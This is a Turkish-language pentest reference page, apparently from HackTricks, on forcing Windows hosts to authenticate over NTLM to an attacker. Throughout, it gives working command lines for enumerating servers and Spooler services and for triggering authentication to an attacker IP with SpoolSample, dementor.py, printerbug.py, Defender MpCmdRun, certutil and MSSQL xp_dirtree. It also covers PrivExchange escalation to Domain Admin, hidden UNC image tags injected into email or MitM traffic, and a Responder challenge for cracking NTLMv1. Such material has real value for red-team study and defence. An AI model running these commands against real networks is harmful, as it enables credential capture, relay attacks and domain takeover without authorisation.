# NTLM Yetkili Kimlik Doğrulamasını Zorlama

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** üzerinden PR göndererek paylaşın.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers), 3. taraf bağımlılıklardan kaçınmak için C# kullanarak MIDL derleyicisini kullanan **uzaktan kimlik doğrulama tetikleyicileri** koleksiyonudur.

## Spooler Servisi Kötüye Kullanımı

Eğer _**Print Spooler**_ servisi **etkinse**, AD kimlik bilgilerini kullanarak **Domain Controller'ın** yazıcı sunucusuna yeni baskı işleri hakkında bir **güncelleme talep edebilir** ve sadece bunu **bir sisteme bildirmesini söyleyebilirsiniz**.\
Yazıcı, bir sisteme bildirim gönderdiğinde, o **sistemle kimlik doğrulaması yapması** gerekmektedir. Bu nedenle, saldırgan _**Print Spooler**_ servisini bir sisteme karşı kimlik doğrulaması yapması için zorlayabilir ve servis bu kimlik doğrulamasında **bilgisayar hesabını** kullanacaktır.

### Etki Alanındaki Windows Sunucularını Bulma

PowerShell kullanarak Windows makinelerinin bir listesini alın. Sunucular genellikle önceliklidir, bu yüzden onlara odaklanalım:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler hizmetinin dinlendiğini bulma

Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) kullanarak, Spooler Hizmetinin dinlenip dinlenmediğini kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ayrıca Linux üzerinde rpcdump.py kullanabilir ve MS-RPRN Protokolünü arayabilirsiniz.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Bir hizmetten keyfi bir ana bilgisayara kimlik doğrulaması isteyin

[**Buradan SpoolSample'ı**](https://github.com/NotMedic/NetNTLMtoSilverTicket) derleyebilirsiniz.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
veya Linux üzerindeyseniz [**3xocyte'in dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanabilirsiniz.
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Sınırsız Delege ile Birleştirme

Bir saldırganın zaten [Sınırsız Delege](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmiş olması durumunda, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Sınırsız delege nedeniyle, **yazıcının bilgisayar hesabının TGT'si**, sınırsız delegeye sahip olan bilgisayarın belleğinde **kaydedilecektir**. Saldırgan zaten bu ana bilgisayarı ele geçirdiği için, bu biletin **alınabilir** ve bunu istismar edebilir ([Bileti Geçir](pass-the-ticket.md)).

## RCP Zorla Kimlik Doğrulama

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange` saldırısı, **Exchange Sunucusu `PushSubscription` özelliğinde** bulunan bir hata sonucunda ortaya çıkar. Bu özellik, Exchange sunucusunun, bir posta kutusu olan herhangi bir etki alanı kullanıcısının, HTTP üzerinden herhangi bir istemci tarafından sağlanan ana bilgisayara kimlik doğrulaması yapmasına zorlanmasına olanak tanır.

Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı yetkilere sahiptir (özellikle, **2019 Öncesi Kumulatif Güncelleme'de etki alanı üzerinde WriteDacl yetkilerine sahiptir**). Bu hata, **bilgiyi LDAP'ye iletmek ve ardından etki alanı NTDS veritabanını çıkarmak** için istismar edilebilir. LDAP'ye iletim mümkün olmadığında, bu hata yine de etki alanı içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulaması yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde istismar edilmesi, herhangi bir kimlik doğrulanmış etki alanı kullanıcı hesabıyla hemen Etki Alanı Yöneticisi erişimi sağlar.

## Windows İçinde

Eğer zaten Windows makinesinin içindeyseniz, Windows'u ayrıcalıklı hesapları kullanarak bir sunucuya bağlamak için aşağıdaki komutu kullanabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

MSSQL, Microsoft SQL Server'ın kısaltmasıdır. Bu, Microsoft tarafından geliştirilen ve yaygın olarak kullanılan bir ilişkisel veritabanı yönetim sistemidir. MSSQL, Windows tabanlı sistemlerde çalışır ve birçok farklı uygulama ve web sitesinde veritabanı yönetimi için kullanılır. MSSQL, güçlü bir veritabanı motoruna sahiptir ve geniş bir özellik seti sunar, bu nedenle birçok kuruluş tarafından tercih edilir.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Veya bu başka bir teknik kullanılabilir: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Certutil.exe lolbin'i (Microsoft imzalı ikili dosya) kullanarak NTLM kimlik doğrulamasını zorlamak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML enjeksiyonu

### E-posta aracılığıyla

Eğer hedeflediğiniz makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, sadece ona bir **1x1 boyutunda bir görüntü içeren e-posta** gönderebilirsiniz. Böylece, e-posta içerisine HTML enjeksiyonu yaparak, kullanıcının tarayıcısında istediğiniz kodu çalıştırabilirsiniz.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve onu açtığında kimlik doğrulama yapmaya çalışacak.

### MitM

Bir bilgisayara MitM saldırısı gerçekleştirebilir ve bir sayfaya HTML enjekte edebilirseniz, aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1 Kırma

[NTLMv1 zorluklarını yakalayabiliyorsanız, onları nasıl kıracağınızı buradan okuyun](../ntlm/#ntlmv1-saldirisi).\
_Unutmayın, NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerekmektedir._

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
